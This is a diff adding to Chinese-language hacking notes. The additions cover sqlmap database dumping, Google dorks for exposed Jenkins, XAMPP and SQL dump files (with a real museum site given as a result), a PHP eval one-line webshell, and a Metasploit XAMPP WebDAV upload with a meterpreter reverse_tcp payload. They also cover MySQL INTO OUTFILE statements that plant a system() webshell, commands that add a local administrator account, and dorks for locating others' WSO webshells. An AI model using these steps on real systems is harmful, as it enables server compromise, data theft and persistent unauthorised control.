@@ -204,6 +204,8 @@ intercept 拦截
 
 # sqlmap -u domain.com/index.aps?id=12 -T table_name -C login_name,pass,username --dump 显示字段内容
 
+# sqlmap -u domain.com/index.php?id=1 --dbms mysql -D db_name --tables
+
 后台登录入口
 
 ```
@@ -211,12 +213,83 @@ intercept 拦截
 PHP 站点的SQL注入
 
 ``` shell
-1. 测试数字型注入点: 
-2. sqlmap 拆解数据库和表名
-3. dump 表数据
-4. 利用 nikto 帮助寻找隐藏目录
+1. 测试数字型注入点
+2. `sqlmap` 拆解数据库和表名
+3. `dump` 表数据
+4. 利用 `nikto` 帮助寻找隐藏目录
 5. 利用网页源代码中的隐藏信息寻找管理后台
 
 常规测试：domain.com/index.php?id=1'
 
 ```
+
+扫描隐藏目录
+
+``` shell
+# nikto -host 主域名
+```
+
+`user: <?php eval($_POST['x']);?>`
+
+## google hack 实战
+
+1. 寻找秩序构建工具 `Jenkins` 的管理面板，有可能获取某些项目的源代码或者敏感信息
+2. 综合利用各种信息搞定 `xampp`
+3. 后门查找
+4. 关于 `google hack database`
+
+### google hack 基础知识
+
+[google hack](http://www.xuanhun521.com)
+
+inurl:8080 intitle: "Dashboard [Jenkins]"
+
+### 搞定 xampp
+
+inurl: "xampp/index" intext:"XAMPP for Windows"
+
+寻找 phpmyadmin 不同验证或者弱口令管理页面，通过 mysql 的 root 权限插入一句话木马提权，获取服务器管理权限
+
+filetype: sql site:org intext:("insert" "admin")
+http://www.prattmuseum.org/
+
+use exploit/windows/http/xampp_webdav_upload_php
+
+set payload php/meterpreter/reverse_tcp
+
+net localgroup administrators name /add
+
+``` mysql
+mysql> create table aa(packet text) type=MYISAM;
+
+mysql> insert into aa(packet) values('<pre><body bgcolor=silver><? @system($_get["cmd"])?></body></pre>');
+
+写入到磁盘，并用PHP访问（存储路径，查找 `phpinfo.php`）
+mysql> select * into outfile 'D:/xampp/htdocs/xampp/aa.php' from aa;
+
+访问URL
+
+http://domain.com/aa.php?cmd=dir
+
+http://domain.com/aa.php?cmd=net user user_name user_pw /add
+http://domain.com/aa.php?cmd=net localgroup administrators user_name /add
+
+cmd: mstsc
+
+ 输入IP 和 用户名
+
+
+```
+
+### 后门获找
+
+Google 搜索目标：intitle:"=[1n73ct10n privat shell]="
+
+intitle:"WSO 2.4" [Sec. Info ], [ Files ], [ Console ], [Sql], [ Php ], [ Safe mode ], [ String tools ], [ Bruteforce ], [ Network ], [ Self remove ]
+
+### 关于 `google hack database`
+
+http://www.exploit-db.com/google-dorks/
+
+需要自己灵活的扩展，以适应中文站点的查询
+
